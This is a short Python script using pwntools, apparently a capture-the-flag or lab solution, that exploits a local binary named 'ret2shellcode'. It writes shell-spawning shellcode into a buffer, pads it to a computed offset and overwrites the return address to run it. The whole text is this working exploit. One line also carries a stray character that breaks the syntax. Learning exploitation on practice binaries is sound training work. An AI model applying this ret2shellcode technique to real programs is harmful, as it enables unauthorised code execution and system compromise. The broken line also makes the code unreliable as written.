from pwn import *
buf2_addr = 0x804a080
shellcode = asm(shellcraft.sh())
offset = 0x6c + 4
shellcode_pad = shellcode + b'a' * (offset - len(shellcode))z
sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_addr))
sh.interactive()